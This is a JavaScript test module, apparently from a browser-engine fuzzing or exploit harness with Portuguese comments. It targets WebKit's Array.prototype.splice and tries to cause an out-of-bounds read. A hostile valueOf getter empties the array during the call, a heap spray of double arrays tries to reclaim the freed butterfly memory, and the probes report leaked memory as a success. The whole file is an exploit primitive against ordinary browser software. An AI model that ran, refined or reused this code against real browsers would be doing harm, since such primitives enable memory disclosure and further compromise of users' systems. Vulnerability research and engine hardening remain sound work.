export default {
    id:       'ARRAY_BUTTERFLY_SPLICE_OOB',
    category: 'CoreJS',
    risk:     'CRITICAL',
    description:
        'Mutação do JSArray Butterfly durante a execução do C++ Array.prototype.splice. ' +
        'O tamanho do array é reduzido a zero dentro de um getter maligno (valueOf) ' +
        'forçando uma leitura de memória fantasma (Dangling Pointer).',

    setup: function() {
        this.results = {};
        
        // Criamos o array vulnerável (Array de Doubles)
        this.vulnArray = [];
        for (let i = 0; i < 20; i++) {
            this.vulnArray.push(1.111111 + i);
        }

        const self = this;
        this.evilObject = {
            valueOf: function() {
                // Destruímos o array original
                self.vulnArray.length = 0;
                
                // FIX: O Spray correto. Pulverizamos ARRAYS (bmalloc) e não DOM!
                // O objetivo é que um destes caia no buraco deixado pela Butterfly morta.
                self.trash = [];
                for(let i = 0; i < 500; i++) {
                    self.trash.push(new Array(20).fill(13.373737));
                }
                
                return 5; // Retorna 5 para o splice() continuar e cortar a partir do índice 5
            }
        };
    },

    trigger: function() {
        try {
            // FIX: O GATILHO. Passamos o evilObject como o índice 'start'.
            // Isto força o WebKit a invocar o valueOf() antes de fazer qualquer movimento de memória!
            this.vulnArray.splice(this.evilObject, 1, 9.999999);
        } catch(e) {
            this.results.error = e.message;
        }
    },

    probe: [
        // Probe 0: O C++ ignorou o nosso length = 0? (Deve manter 20 devido ao splice C++)
        s => s.vulnArray.length,
        
        // Probe 1: O Array mudou para Contiguous ou continuou Double?
        s => typeof s.vulnArray[10],
        
        // Probe 2: O Leitor de OOB
        s => {
            let val = s.vulnArray[10];
            
            // Se lemos um número, e não é o 11.111111 (que era o original no índice 10),
            // nem undefined (que seria o normal se o array fosse realmente 0)...
            if (typeof val === 'number' && !isNaN(val) && val !== (1.111111 + 10)) {
                return `💥 SUCESSO! OOB Read (Lixo da RAM): ${val}`;
            }
            return 'Protegido / Array Vazio';
        }
    ],

    cleanup: function() {
        this.vulnArray = null;
        this.evilObject = null;
        this.trash = null;
    }
};
